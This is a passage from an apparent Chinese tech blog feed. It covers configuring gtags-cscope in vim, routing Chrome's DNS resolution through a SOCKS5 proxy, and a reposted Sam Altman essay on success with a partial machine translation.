class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot; Usage</span><br><span class="hljs-comment">&quot; -----</span><br><span class="hljs-comment">&quot; First of all, you must execute gtags(1) at the root of source directory</span><br><span class="hljs-comment">&quot; to make tag files. Assuming that your source directory is &#x27;/var/src&#x27;,</span><br><span class="hljs-comment">&quot; it is neccessary to execute the following commands.</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot; [Load vim]</span><br><span class="hljs-comment">&quot;$ cd /var/src</span><br><span class="hljs-comment">&quot;$ gtags</span><br><span class="hljs-comment">&quot;$ vim</span><br><span class="hljs-comment">&quot; [Load gtags-cscope]</span><br><span class="hljs-comment">&quot;:GtagsCscope &lt;ENTER&gt;            (in vim command line)</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot; Basic command</span><br><span class="hljs-comment">&quot; -------------</span><br><span class="hljs-comment">&quot; Then you can use cs commands except for the &#x27;d&#x27;(2) command.</span><br><span class="hljs-comment">&quot; Profitable commands are assigned to keys like follows:</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot;explanationcommand</span><br><span class="hljs-comment">&quot;----------------------------------------------------------</span><br><span class="hljs-comment">&quot;Find symbol:cs find 0 or s</span><br><span class="hljs-comment">&quot;Find definition:cs find 1 or g</span><br><span class="hljs-comment">&quot;Find functions called by this function(not implemented)</span><br><span class="hljs-comment">&quot;Find reference:cs find 3 or c</span><br><span class="hljs-comment">&quot;Find text string:cs find 4 or t</span><br><span class="hljs-comment">&quot;Find egrep pattern:cs find 6 or e</span><br><span class="hljs-comment">&quot;Find path:cs find 7 or f</span><br><span class="hljs-comment">&quot;Find include file:cs find 8 or i</span><br><span class="hljs-comment">&quot;Find assignments:cs find 9 or a</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot; You can move tag list using:</span><br><span class="hljs-comment">&quot;Go to the next tag :tn</span><br><span class="hljs-comment">&quot;Go to the previous tag :tp</span><br><span class="hljs-comment">&quot;Pop tag stack :pop</span><br></code></pre></td></tr></table></figure><p>除了不能使用 <code>:cs find d</code>  命令，可以使用其他所有的命令，gtags-cscope.vim 使用快捷键替代了输入命令，常用的快捷键的含义如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">g</span> - 查看光标下符号的定义<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">s</span> - 查看光标下符号<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">c</span> - 查看光标下符号的引用<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">f</span> - 查找光标下的文件<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">i</span> - 查找哪些文件 include 了本文件<br></code></pre></td></tr></table></figure><p><code>&lt;C-\&gt;g</code>  是同时按下 Ctrl 和 <code>\</code> ，接着再按 g ， 其他的同理。</p><p>在 .vimrc 中添加下面的配置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> <span class="hljs-title function_">has</span><span class="hljs-params">(<span class="hljs-string">&quot;cscope&quot;</span>)</span><br>&quot; To use the <span class="hljs-keyword">default</span> key/mouse mapping:<br>    let GtagsCscope_Auto_Map = <span class="hljs-number">1</span><br><br><span class="hljs-string">&quot; To deterring interruption:</span><br><span class="hljs-string">    let GtagsCscope_Keep_Alive = 1</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    set cscopetag</span><br><span class="hljs-string">    set csprg=/usr/bin/gtags-cscope</span><br><span class="hljs-string">    set csto=1</span><br><span class="hljs-string">    set nocsverb</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span> Set enviroment values<br>    let $GTAGSLABEL=<span class="hljs-string">&#x27;native-pygments&#x27;</span><br>    let $GTAGSCONF=<span class="hljs-string">&#x27;/etc/gtags.conf&#x27;</span><br><br>endif<br></code></pre></td></tr></table></figure><h2 id="☆-4-GUN-global-的使用方法"><a href="#☆-4-GUN-global-的使用方法" class="headerlink" title="☆ 4.  GUN global 的使用方法"></a>☆ 4.  GUN global 的使用方法</h2><p>切换到源码目录，执行下面的命令将生成 Global 所需要的索引文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.h&quot;</span> -o -name <span class="hljs-string">&quot;*.hpp&quot;</span> -o -name <span class="hljs-string">&quot;*.hh&quot;</span> -o -name <span class="hljs-string">&quot;*.hxx&quot;</span> -o -name <span class="hljs-string">&quot;*.c&quot;</span> -o -name <span class="hljs-string">&quot;*.cc&quot;</span> -o -name <span class="hljs-string">&quot;*.cpp&quot;</span> -o -name <span class="hljs-string">&quot;*.cxx&quot;</span> &gt; gtags.files<br>gtags -f gtags.files<br></code></pre></td></tr></table></figure><p>上面的命令执行完毕后，会生成 GPATH、GRTAGS、GTAGS 几个索引文件。</p><p>在 vim 中执行 <code>:GtagsCscope &lt;ENTER&gt; </code> 即可加载索引文件，最后就是使用快捷键愉快地浏览源码文件了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.gnu.org/software/global/global.html">https://www.gnu.org/software/global/global.html</a></li><li><a href="https://www.gnu.org/software/global/globaldoc_toc.html">https://www.gnu.org/software/global/globaldoc_toc.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome 浏览器中的远程 DNS 解析</title>
    <link href="/cn/dns_via_socks_proxy_in_chrome/"/>
    <url>/cn/dns_via_socks_proxy_in_chrome/</url>
    
    <content type="html"><![CDATA[<p>由于伟大的X火长城的存在，在境内进行 DNS 解析请求返回的报文不一定是靠谱的，有必要使用远程的服务器进行DNS 解析来缓解这个问题。根据 Google 的文档如果设置了 socks5 代理，URL 中的 hostname 将由代理服务器解析。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The <span class="hljs-comment">--proxy-server=&quot;socks5://myproxy:8080&quot; flag tells Chrome to send all http:// and https:// URL requests through the SOCKS proxy server &quot;myproxy:8080&quot;,</span><br><span class="hljs-keyword">using</span> <span class="hljs-built_in">version</span> <span class="hljs-number">5</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> SOCKS protocol. The hostname <span class="hljs-keyword">for</span> these URLs will be resolved <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> proxy server, <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> locally <span class="hljs-keyword">by</span> Chrome.<br></code></pre></td></tr></table></figure><p>但是由于 chrome 浏览器的 DNS prefetching  特性，即使设置了 socks5 代理 DNS prefetching 特性也会使用本地网络进行 DNS 解析。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The <span class="hljs-comment">--proxy-server flag applies to URL loads only. </span><br>There are other components <span class="hljs-keyword">of</span> Chrome which may issue DNS resolves directly <span class="hljs-keyword">and</span> hence bypass this proxy <span class="hljs-keyword">server</span>. <br>The most notable such component <span class="hljs-keyword">is</span> the &quot;DNS prefetcher&quot;. <br>Hence <span class="hljs-keyword">if</span> DNS prefetching <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> disabled <span class="hljs-keyword">in</span> Chrome <span class="hljs-keyword">then</span> you will still see <span class="hljs-keyword">local</span> DNS requests being issued <span class="hljs-keyword">by</span> Chrome despite <span class="hljs-keyword">having</span> specified a SOCKS v5 proxy <span class="hljs-keyword">server</span>.<br></code></pre></td></tr></table></figure><p>下面是禁用 DNS prefetching 的方法，新版本的 chrome 已经取消了直接针对 DNS prefetching 设置的选项，有一个预加载网页的选项，需要把这个选项关闭，具体设置方法为：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">设置 -&gt; 隐私设置和安全性 -&gt; Cookie 及其他网站数据 -&gt; 预加载网页，以便实现更快速的浏览和搜索<br></code></pre></td></tr></table></figure><p>禁用 DNS prefetching 的方案是脆弱的，Chrome 可能在其他的地方使用 raw dns requsts （ Chrome 发送 DNS 请求报文)， 绕过代理服务器直接使用本地网络进行 DNS 解析。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Disabling DNS prefetching would solve this problem, <br>however <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> a fragile solution <span class="hljs-keyword">since</span> once needs <span class="hljs-keyword">to</span> be aware <span class="hljs-keyword">of</span> all <span class="hljs-keyword">the</span> areas <span class="hljs-keyword">in</span> Chrome which issue raw DNS requests.<br></code></pre></td></tr></table></figure><p>所以最终的解决方案是使用 Google 文档中的命令行参数 <code>--host-resolver-rules=</code> ，经过测试可以使用下面的命令行来解决 DNS 远程解析</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">google-chrome --proxy-server<span class="hljs-operator">=</span><span class="hljs-string">&quot;socks5://127.0.0.1:9999&quot;</span> --host-resolver-rules<span class="hljs-operator">=</span><span class="hljs-string">&quot;MAP * 0.0.0.0, EXClUDE 127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure><p>–host-resolver-rules 将阻止Chrome 使用本地网络发起 DNS 请求，具体的方式是将 DNS 请求转向一个不存在的地址，注意需要排除 sock5 代理的地址。</p><p>在实际使用过程中发现，如果不指定 –host-resolver-rules 命令行参数，有少量 DNS 请求会使用本地网络，比如 safebrowsing.googleapis.com</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.chromium.org/developers/design-documents/network-stack/socks-proxy/">https://www.chromium.org/developers/design-documents/network-stack/socks-proxy/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>How to be successful</title>
    <link href="/cn/How%20to%20be%20successful/"/>
    <url>/cn/How%20to%20be%20successful/</url>
    
    <content type="html"><![CDATA[<p>source: <a href="https://blog.samaltman.com/how-to-be-successful">https://blog.samaltman.com/how-to-be-successful</a></p><p>I’ve observed thousands of founders and thought a lot about what it takes to make a huge amount of money or to create something important. Usually, people start off wanting the former and end up wanting the latter.</p><p>Here are 13 thoughts about how to achieve such outlier success. Everything here is easier to do once you’ve already reached a baseline degree of success (through privilege or effort) and want to put in the work to turn that into outlier success. [1] But much of it applies to anyone.</p><h2 id="1-Compound-yourself"><a href="#1-Compound-yourself" class="headerlink" title="1. Compound yourself"></a>1. Compound yourself</h2><p>Compounding is magic. Look for it everywhere. Exponential curves are the key to wealth generation.</p><p>A medium-sized business that grows 50% in value every year becomes huge in a very short amount of time. Few businesses in the world have true network effects and extreme scalability. But with technology, more and more will.  It’s worth a lot of effort to find them and create them.</p><p>You also want to be an exponential curve yourself—you should aim for your life to follow an ever-increasing up-and-to-the-right trajectory. It’s important to move towards a career that has a compounding effect—most careers progress fairly linearly.</p><p>You don’t want to be in a career where people who have been doing it for two years can be as effective as people who have been doing it for twenty—your rate of learning should always be high. As your career progresses, each unit of work you do should generate more and more results. There are many ways to get this leverage, such as capital, technology, brand, network effects, and managing people.</p><p>It’s useful to focus on adding another zero to whatever you define as your success metric—money, status, impact on the world, or whatever. I am willing to take as much time as needed between projects to find my next thing. But I always want it to be a project that, if successful, will make the rest of my career look like a footnote.</p><p>Most people get bogged down in linear opportunities. Be willing to let small opportunities go to focus on potential step changes.</p><p>I think the biggest competitive advantage in business—either for a company or for an individual’s career—is long-term thinking with a broad view of how different systems in the world are going to come together. One of the notable aspects of compound growth is that the furthest out years are the most important. In a world where almost no one takes a truly long-term view, the market richly rewards those who do.</p><p>Trust the exponential, be patient, and be pleasantly surprised.</p><h2 id="2-Have-almost-too-much-self-belief"><a href="#2-Have-almost-too-much-self-belief" class="headerlink" title="2. Have almost too much self-belief"></a>2. Have almost too much self-belief</h2><p>Self-belief is immensely powerful. The most successful people I know believe in themselves almost to the point of delusion.</p><p>Cultivate this early. As you get more data points that your judgment is good and you can consistently deliver results, trust yourself more.</p><p>If you don’t believe in yourself, it’s hard to let yourself have contrarian ideas about the future. But this is where most value gets created.</p><p>I remember when Elon Musk took me on a tour of the SpaceX factory many years ago. He talked in detail about manufacturing every part of the rocket, but the thing that sticks in memory was the look of absolute certainty on his face when he talked about sending large rockets to Mars. I left thinking “huh, so that’s the benchmark for what conviction looks like.”</p><p>Managing your own morale—and your team’s morale—is one of the greatest challenges of most endeavors. It’s almost impossible without a lot of self-belief. And unfortunately, the more ambitious you are, the more the world will try to tear you down.  </p><p>Most highly successful people have been really right about the future at least once at a time when people thought they were wrong. If not, they would have faced much more competition.</p><p>Self-belief must be balanced with self-awareness. I used to hate criticism of any sort and actively avoided it. Now I try to always listen to it with the assumption that it’s true, and then decide if I want to act on it or not. Truth-seeking is hard and often painful, but it is what separates self-belief from self-delusion.</p><p>This balance also helps you avoid coming across as entitled and out of touch.</p><h2 id="3-Learn-to-think-independently"><a href="#3-Learn-to-think-independently" class="headerlink" title="3. Learn to think independently"></a>3. Learn to think independently</h2><p>Entrepreneurship is very difficult to teach because original thinking is very difficult to teach. School is not set up to teach this—in fact, it generally rewards the opposite. So you have to cultivate it on your own.</p><p>Thinking from first principles and trying to generate new ideas is fun, and finding people to exchange them with is a great way to get better at this. The next step is to find easy, fast ways to test these ideas in the real world.</p><p>“I will fail many times, and I will be really right once” is the entrepreneurs’ way. You have to give yourself a lot of chances to get lucky.</p><p>One of the most powerful lessons to learn is that you can figure out what to do in situations that seem to have no solution. The more times you do this, the more you will believe it. Grit comes from learning you can get back up after you get knocked down.</p><h2 id="4-Get-good-at-“sales”"><a href="#4-Get-good-at-“sales”" class="headerlink" title="4. Get good at “sales”"></a>4. Get good at “sales”</h2><p>Self-belief alone is not sufficient—you also have to be able to convince other people of what you believe.</p><p>All great careers, to some degree, become sales jobs. You have to evangelize your plans to customers, prospective employees, the press, investors, etc. This requires an inspiring vision, strong communication skills, some degree of charisma, and evidence of execution ability.</p><p>Getting good at communication—particularly written communication—is an investment worth making. My best advice for communicating clearly is to first make sure your thinking is clear and then use plain, concise language.</p><p>The best way to be good at sales is to genuinely believe in what you’re selling. Selling what you truly believe in feels great, and trying to sell snake oil feels awful.</p><p>Getting good at sales is like improving at any other skill—anyone can get better at it with deliberate practice. But for some reason, perhaps because it feels distasteful, many people treat it as something unlearnable.</p><p>My other big sales tip is to show up in person whenever it’s important. When I was first starting out, I was always willing to get on a plane. It was frequently unnecessary, but three times it led to career-making turning points for me that otherwise would have gone the other way.</p><h2 id="5-Make-it-easy-to-take-risks"><a href="#5-Make-it-easy-to-take-risks" class="headerlink" title="5. Make it easy to take risks"></a>5. Make it easy to take risks</h2><p>Most people overestimate risk and underestimate reward. Taking risks is important because it’s impossible to be right all the time—you have to try many things and adapt quickly as you learn more.</p><p>It’s often easier to take risks early in your career; you don’t have much to lose, and you potentially have a lot to gain. Once you’ve gotten yourself to a point where you have your basic obligations covered you should try to make it easy to take risks. Look for small bets you can make where you lose 1x if you’re wrong but make 100x if it works. Then make a bigger bet in that direction.</p><p>Don’t save up for too long, though. At YC, we’ve often noticed a problem with founders that have spent a lot of time working at Google or Facebook. When people get used to a comfortable life, a predictable job, and a reputation of succeeding at whatever they do, it gets very hard to leave that behind (and people have an incredible ability to always match their lifestyle to next year’s salary). Even if they do leave, the temptation to return is great. It’s easy—and human nature—to prioritize short-term gain and convenience over long-term fulfillment.  </p><p>But when you aren’t on the treadmill, you can follow your hunches and spend time on things that might turn out to be really interesting. Keeping your life cheap and flexible for as long as you can is a powerful way to do this, but obviously comes with tradeoffs.</p><h2 id="6-Focus"><a href="#6-Focus" class="headerlink" title="6. Focus"></a>6. Focus</h2><p>Focus is a force multiplier on work.</p><p>Almost everyone I’ve ever met would be well-served by spending more time thinking about what to focus on. It is much more important to work on the right thing than it is to work many hours. Most people waste most of their time on stuff that doesn’t matter.</p><p>Once you have figured out what to do, be unstoppable about getting your small handful of priorities accomplished quickly. I have yet to meet a slow-moving person who is very successful.</p><h2 id="7-Work-hard"><a href="#7-Work-hard" class="headerlink" title="7. Work hard"></a>7. Work hard</h2><p>You can get to about the 90th percentile in your field by working either smart or hard, which is still a great accomplishment. But getting to the 99th percentile requires both—you will be competing with other very talented people who will have great ideas and be willing to work a lot.</p><p>Extreme people get extreme results. Working a lot comes with huge life trade-offs, and it’s perfectly rational to decide not to do it. But it has a lot of advantages. As in most cases, momentum compounds, and success begets success.</p><p>And it’s often really fun. One of the great joys in life is finding your purpose, excelling at it, and discovering that your impact matters to something larger than yourself. A YC founder recently expressed great surprise about how much happier and more fulfilled he was after leaving his job at a big company and working towards his maximum possible impact. Working hard at that should be celebrated.  </p><p>It’s not entirely clear to me why working hard has become a Bad Thing in certain parts of the US, but this is certainly not the case in other parts of the world—the amount of energy and drive exhibited by entrepreneurs outside of the US is quickly becoming the new benchmark.</p><p>You have to figure out how to work hard without burning out. People find their own strategies for this, but one that almost always works is to find work you like doing with people you enjoy spending a lot of time with.</p><p>I think people who pretend you can be super successful professionally without working most of the time (for some period of your life) are doing a disservice. In fact, work stamina seems to be one of the biggest predictors of long-term success.</p><p>One more thought about working hard: do it at the beginning of your career. Hard work compounds like interest, and the earlier you do it, the more time you have for the benefits to pay off. It’s also easier to work hard when you have fewer other responsibilities, which is frequently but not always the case when you’re young.</p><h2 id="8-Be-bold"><a href="#8-Be-bold" class="headerlink" title="8. Be bold"></a>8. Be bold</h2><p>I believe that it’s easier to do a hard startup than an easy startup. People want to be part of something exciting and feel that their work matters.</p><p>If you are making progress on an important problem, you will have a constant tailwind of people wanting to help you. Let yourself grow more ambitious, and don’t be afraid to work on what you really want to work on.</p><p>If everyone else is starting meme companies, and you want to start a gene-editing company, then do that and don’t second guess it.</p><p>Follow your curiosity. Things that seem exciting to you will often seem exciting to other people too.</p><h2 id="9-Be-willful"><a href="#9-Be-willful" class="headerlink" title="9. Be willful"></a>9. Be willful</h2><p>A big secret is that you can bend the world to your will a surprising percentage of the time—most people don’t even try, and just accept that things are the way that they are.</p><p>People have an enormous capacity to make things happen. A combination of self-doubt, giving up too early, and not pushing hard enough prevents most people from ever reaching anywhere near their potential.</p><p>Ask for what you want. You usually won’t get it, and often the rejection will be painful. But when this works, it works surprisingly well.</p><p>Almost always, the people who say “I am going to keep going until this works, and no matter what the challenges are I’m going to figure them out”, and mean it, go on to succeed. They are persistent long enough to give themselves a chance for luck to go their way.</p><p>Airbnb is my benchmark for this. There are so many stories they tell that I wouldn’t recommend trying to reproduce (keeping maxed-out credit cards in those nine-slot three-ring binder pages kids use for baseball cards, eating dollar store cereal for every meal, battle after battle with powerful entrenched interest, and on and on) but they managed to survive long enough for luck to go their way.</p><p>To be willful, you have to be optimistic—hopefully this is a personality trait that can be improved with practice. I have never met a very successful pessimistic person.</p><h2 id="10-Be-hard-to-compete-with"><a href="#10-Be-hard-to-compete-with" class="headerlink" title="10. Be hard to compete with"></a>10. Be hard to compete with</h2><p>Most people understand that companies are more valuable if they are difficult to compete with. This is important, and obviously true.</p><p>But this holds true for you as an individual as well. If what you do can be done by someone else, it eventually will be, and for less money.</p><p>The best way to become difficult to compete with is to build up leverage. For example, you can do it with personal relationships, by building a strong personal brand, or by getting good at the intersection of multiple different fields. There are many other strategies, but you have to figure out some way to do it.</p><p>Most people do whatever most people they hang out with do. This mimetic behavior is usually a mistake—if you’re doing the same thing everyone else is doing, you will not be hard to compete with.</p><h2 id="11-Build-a-network"><a href="#11-Build-a-network" class="headerlink" title="11. Build a network"></a>11. Build a network</h2><p>Great work requires teams. Developing a network of talented people to work with—sometimes closely, sometimes loosely—is an essential part of a great career. The size of the network of really talented people you know often becomes the limiter for what you can accomplish.</p><p>An effective way to build a network is to help people as much as you can. Doing this, over a long period of time, is what lead to most of my best career opportunities and three of my four best investments. I’m continually surprised how often something good happens to me because of something I did to help a founder ten years ago.</p><p>One of the best ways to build a network is to develop a reputation for really taking care of the people who work with you. Be overly generous with sharing the upside; it will come back to you 10x. Also, learn how to evaluate what people are great at, and put them in those roles. (This is the most important thing I have learned about management, and I haven’t read much about it.) You want to have a reputation for pushing people hard enough that they accomplish more than they thought they could, but not so hard they burn out.</p><p>Everyone is better at some things than others. Define yourself by your strengths, not your weaknesses. Acknowledge your weaknesses and figure out how to work around them, but don’t let them stop you from doing what you want to do. “I can’t do X because I’m not good at Y” is something I hear from entrepreneurs surprisingly often, and almost always reflects a lack of creativity. The best way to make up for your weaknesses is to hire complementary team members instead of just hiring people who are good at the same things you are.</p><p>A particularly valuable part of building a network is to get good at discovering undiscovered talent. Quickly spotting intelligence, drive, and creativity gets much easier with practice. The easiest way to learn is just to meet a lot of people, and keep track of who goes on to impress you and who doesn’t. Remember that you are mostly looking for rate of improvement, and don’t overvalue experience or current accomplishment.</p><p>I try to always ask myself when I meet someone new “is this person a force of nature?” It’s a pretty good heuristic for finding people who are likely to accomplish great things.</p><p>A special case of developing a network is finding someone eminent to take a bet on you, ideally early in your career. The best way to do this, no surprise, is to go out of your way to be helpful. (And remember that you have to pay this forward at some point later!)</p><p>Finally, remember to spend your time with positive people who support your ambitions.</p><h2 id="12-You-get-rich-by-owning-things"><a href="#12-You-get-rich-by-owning-things" class="headerlink" title="12. You get rich by owning things"></a>12. You get rich by owning things</h2><p>The biggest economic misunderstanding of my childhood was that people got rich from high salaries. Though there are some exceptions—entertainers for example —almost no one in the history of the Forbes list has gotten there with a salary.</p><p>You get truly rich by owning things that increase rapidly in value.</p><p>This can be a piece of a business, real estate, natural resource, intellectual property, or other similar things. But somehow or other, you need to own equity in something, instead of just selling your time. Time only scales linearly.</p><p>The best way to make things that increase rapidly in value is by making things people want at scale.</p><h2 id="13-Be-internally-driven"><a href="#13-Be-internally-driven" class="headerlink" title="13. Be internally driven"></a>13. Be internally driven</h2><p>Most people are primarily externally driven; they do what they do because they want to impress other people. This is bad for many reasons, but here are two important ones.</p><p>First, you will work on consensus ideas and on consensus career tracks.  You will care a lot—much more than you realize—if other people think you’re doing the right thing. This will probably prevent you from doing truly interesting work, and even if you do, someone else would have done it anyway.</p><p>Second, you will usually get risk calculations wrong. You’ll be very focused on keeping up with other people and not falling behind in competitive games, even in the short term.</p><p>Smart people seem to be especially at risk of such externally-driven behavior. Being aware of it helps, but only a little—you will likely have to work super-hard to not fall in the mimetic trap.</p><p>The most successful people I know are primarily internally driven; they do what they do to impress themselves and because they feel compelled to make something happen in the world. After you’ve made enough money to buy whatever you want and gotten enough social status that it stops being fun to get more, this is the only force I know of that will continue to drive you to higher levels of performance.</p><p>This is why the question of a person’s motivation is so important. It’s the first thing I try to understand about someone. The right motivations are hard to define a set of rules for, but you know it when you see it.</p><p>Jessica Livingston and Paul Graham are my benchmarks for this. YC was widely mocked for the first few years, and almost no one thought it would be a big success when they first started. But they thought it would be great for the world if it worked, and they love helping people, and they were convinced their new model was better than the existing model.</p><p>Eventually, you will define your success by performing excellent work in areas that are important to you. The sooner you can start off in that direction, the further you will be able to go. It is hard to be wildly successful at anything you aren’t obsessed with.</p><h2 id="1-A-comment-response-I-wrote-on-HN"><a href="#1-A-comment-response-I-wrote-on-HN" class="headerlink" title="[1] A comment response I wrote on HN:"></a>[1] A comment response I wrote on HN:</h2><p>One of the biggest reasons I’m excited about basic income is the amount of human potential it will unleash by freeing more people to take risks.<br>Until then, if you aren’t born lucky, you have to claw your way up for awhile before you can take big swings. If you are born in extreme poverty, then this is super difficult :(</p><p>It is obviously an incredible shame and waste that opportunity is so unevenly distributed. But I’ve witnessed enough people be born with the deck stacked badly against them and go on to incredible success to know it’s possible.</p><p>I am deeply aware of the fact that I personally would not be where I am if I weren’t born incredibly lucky.</p><p>Thanks to Brian Armstrong, Greg Brockman, Dalton Caldwell, Diane von Furstenberg, Maddie Hall, Drew Houston, Vinod Khosla, Jessica Livingston, Jon Levy, Luke Miles (6 drafts!), Michael Moritz, Ali Rowghani, Michael Seibel, Peter Thiel, Tracy Young and Shivon Zilis for reviewing drafts of this, and thanks especially to Lachy Groom for help writing it.</p><h2 id="以下是-DeepL-的翻译"><a href="#以下是-DeepL-的翻译" class="headerlink" title="以下是 DeepL 的翻译"></a>以下是 DeepL 的翻译</h2><p>标题： 如何获得成功</p><p>我观察了数以千计的创始人，并思考了很多关于赚取巨额金钱或创造重要事物所需的东西。通常情况下，人们一开始希望得到前者，最后却希望得到后者。</p><p>这里有13个关于如何实现这种超常成功的想法。一旦你已经达到了成功的基本程度（通过特权或努力），并想投入工作将其转化为离群的成功，这里的一切就更容易做到。[1] 但其中大部分内容适用于任何人。</p><h2 id="1-复利自己"><a href="#1-复利自己" class="headerlink" title="1. 复利自己"></a>1. 复利自己</h2><p>复利是一种魔法。到处寻找它。指数曲线是创造财富的关键。</p><p>一个中等规模的企业，如果每年的价值增长50%，就会在很短的时间内变得巨大。世界上很少有企业拥有真正的网络效应和极端的可扩展性。但随着技术的发展，会有越来越多的企业。 值得花大力气去寻找它们，创造它们。</p><p>你也想让自己成为一条指数曲线–你的目标应该是让你的生活遵循一条不断增加的向上和向右的轨迹。重要的是，要朝着具有复合效应的职业发展–大多数职业的发展是相当线性的。</p><p>你不希望在一个职业中，做了两年的人可以和做了二十年的人一样有效–你的学习率应该一直很高。随着你事业的发展，你所做的每一个单位的工作应该产生越来越多的结果。有很多方法可以获得这种杠杆作用，如资本、技术、品牌、网络效应和管理人。</p><p>不管你把什么定义为你的成功指标–金钱、地位、对世界的影响，或者其他什么，专注于再加一个零是很有用的。我愿意在项目之间花尽可能多的时间来寻找我的下一件事。但我总是希望它是一个项目，如果成功，将使我职业生涯的其余部分看起来像一个脚注。</p><p>大多数人在线性机会中陷入困境。要愿意让小的机会消失，以专注于潜在的步骤变化。</p><p>我认为商业上最大的竞争优势–无论是对公司还是对个人的职业生涯–是长期的思考，对世界上不同的系统如何结合起来有一个广泛的看法。复合增长的一个显著方面是，最远的年份是最重要的。在这个世界上，几乎没有人采取真正的长期观点，市场对那些这样做的人给予了丰厚的回报。</p><p>相信指数，要有耐心，并获得惊喜。</p><h2 id="2-拥有几乎太多的自信心"><a href="#2-拥有几乎太多的自信心" class="headerlink" title="2. 拥有几乎太多的自信心"></a>2. 拥有几乎太多的自信心</h2><p>自信的力量是巨大的。我认识的最成功的人对自己的信念几乎达到了妄想的程度。</p><p>尽早培养这种信念。当你得到更多的数据，证明你的判断力是好的，而且你能持续提供结果时，就更加相信自己。</p><p>如果你不相信自己，就很难让自己对未来有逆向的想法。但这是最能创造价值的地方。</p><p>我记得很多年前，埃隆-马斯克带我参观了SpaceX的工厂。他详细谈论了火箭的每一个部分的制造，但让我记忆犹新的是，当他谈到将大型火箭送往火星时，他脸上露出了绝对肯定的表情。我离开时想：”啊，原来这就是信念的基准。”</p><p>管理你自己的士气–以及你的团队的士气–是大多数工作的最大挑战之一。如果没有足够的自信心，这几乎是不可能的。不幸的是，你越有雄心壮志，世界就越想把你打倒。 </p><p>大多数高度成功的人至少有一次在人们认为他们错了的时候，对未来的看法是真正正确的。如果不是这样，他们会面临更多的竞争。</p><p>自信必须与自我意识相平衡。我曾经讨厌任何形式的批评，并主动回避它。现在，我试着总是在假设它是真实的情况下听取它，然后决定是否要采取行动。寻求真理是困难的，而且常常是痛苦的，但它是区分自信心和自欺欺人的原因。</p><p>这种平衡也有助于你避免表现出有权和不合群的样子。</p><h2 id="3-学会独立思考"><a href="#3-学会独立思考" class="headerlink" title="3. 学会独立思考"></a>3. 学会独立思考</h2><p>创业精神是很难教的，因为原创性思维是很难教的。学校的设置不是为了教这个–事实上，它通常奖励相反的东西。所以你必须自己培养它。</p><p>从第一原则出发思考并试图产生新的想法是很有趣的，而找到与之交流的人是在这方面做得更好的一个好方法。下一步是找到简单、快速的方法，在现实世界中测试这些想法。</p><p>“我会失败很多次，而我真的会对一次 “是企业家的方式。你必须给自己很多机会来获得幸运。</p><p>要学习的最有力的课程之一是，你可以在似乎没有解决方案的情况下想出办法。你这样做的次数越多，你就会越相信它。勇气来自于学习你可以在被击倒后重新站起来。</p><h2 id="4-善于-“销售”"><a href="#4-善于-“销售”" class="headerlink" title="4. 善于 “销售”"></a>4. 善于 